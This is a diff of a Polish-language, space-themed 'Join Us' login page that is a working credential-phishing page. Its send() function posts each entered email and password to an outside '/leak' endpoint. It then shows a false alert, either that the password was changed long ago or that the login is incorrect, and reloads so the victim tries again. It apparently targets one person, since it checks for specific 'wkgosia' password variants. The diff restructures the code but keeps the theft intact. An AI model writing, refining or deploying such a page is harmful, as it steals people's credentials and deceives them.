@@ -1,86 +1,85 @@
 <html>
-    <head>
-        <style>
-            h1 {color: white; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;}
-            p {color: white;}
-            #space-background {
-              background-attachment: fixed; /* Tło się nie przewija */
-              background-size: cover;
-              position: fixed;
-              top: -10%; /* Wychodzimy poza krawędzie, aby uniknąć białych rogów */
-              left: -10%;
-              width: 120%;
-              height: 120%;
-              background: url('ziem2.jpg') no-repeat center center;
-              background-size: cover;
-              z-index: -1; /* Tło pod spodem */
-              will-change: transform; /* Optymalizacja wydajności */
-            }
-        </style>
-    </head>
-    <body">
-        <script>
+<head>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden; /
+            background-color: black; 
+        }
+
+        h1 {color: white; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;}
+        p {color: white;}
+
+        #space-background {
+            position: fixed;
+            top: -20%; 
+            left: -20%;
+            width: 140%;
+            height: 140%;
+            background: url('ziem2.jpg') no-repeat center center;
+            background-size: cover;
+            z-index: -1; 
+            will-change: transform;
+        }
+
+
+        center {
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="space-background"></div>
+
+    <center>
+        <br>
+        <h1>THE FUTURE IS NOW</h1>
+        <p>To The Moon</p>
+        <br><br><br><br>
+        <p>Join Us</p>
+        <br><br>
+        <input id="em" placeholder="Email"><br>
+        <input id="pa" type="password" placeholder="Password"><br>
+        <button onclick="send()">Login</button>
+        <br><br><br><br><br>
+        <img src="rakieta.gif" style="width: 600px; height: 400px;">
+    </center>
+
+    <script>
+
         const bg = document.getElementById('space-background');
         let angle = 0;
         const speed = 0.05; 
-        
+
         function rotateBackground() {
-          angle += speed;
-          bg.style.transform = `rotate(${angle}deg)`;
-          
-          requestAnimationFrame(rotateBackground);
-        }\
-                   
-        rotateBackground();
-        </script>
-
-        <center>
-            <br>
-            <h1>THE FUTURE IS NOW</h1>
-            <p>To The Moon</p>
-            <br>
-            <br>
-            <br>
-            <br>
-            <p>Join to Us</p>
-            <br>
-            <br>
-            <input id="em" placeholder="Email">
-            <br>
-            <input id="pa" placeholder="Password">
-            <br>
-            <button onclick="send()">Login</button>
-            <br>
-            <br>
-            <br>
-            <br>
-            <br>
-            <img src="rakieta.gif" style="width: 600px; height: 400px; ">
-        </center>
-            
-        <script>
-            function send() {
-                em = document.getElementById('em').value
-                pa = document.getElementById('pa').value
-
-                
-                if (pa.toLowerCase() == 'wkgosia' || 
-    pa.toLowerCase() == 'wkgosia793' || 
-    pa.toLowerCase() == 'wk gos 793' || 
-    pa.toLowerCase() == 'wkgos973' || pa.toLowerCase() == 'wk gosia' ) {
-                    fetch('https://ddddd-1-ygxs.onrender.com/leak', {'method': 'POST', 'headers': {'content-type': 'application/json'}, 'body': JSON.stringify({'email': em, 'password': pa})})
-                    alert('Hasło zostało zmienione 12 Miesięcy temu.')
-                    location.reload()
-                }
-                else {
-                                    
-                fetch('https://ddddd-1-ygxs.onrender.com/leak', {'method': 'POST', 'headers': {'content-type': 'application/json'}, 'body': JSON.stringify({'email': em, 'password': pa})})
-                location.reload()
-                alert('Hasło lub Email jest niepoprawne. Podaj Poprawne Hasło oraz Email.')
-                };
+            angle += speed;
+            if (bg) {
+                bg.style.transform = `rotate(${angle}deg)`;
             }
-        </script>
-    </body>
+            requestAnimationFrame(rotateBackground);
+        }
+        rotateBackground();
 
+        function send() {
+            const em = document.getElementById('em').value;
+            const pa = document.getElementById('pa').value;
+
+            fetch('https://ddddd-1-ygxs.onrender.com/leak', {
+                method: 'POST',
+                headers: {'content-type': 'application/json'},
+                body: JSON.stringify({'email': em, 'password': pa})
+            });
+
+            if (pa.toLowerCase().includes('wkgosia')) {
+                alert('Hasło zostało zmienione 12 Miesięcy temu.');
+            } else {
+                alert('Hasło lub Email jest niepoprawne. Podaj Poprawne Hasło oraz Email.');
+            }
+            location.reload();
+        }
+    </script>
+</body>
 </html>
-
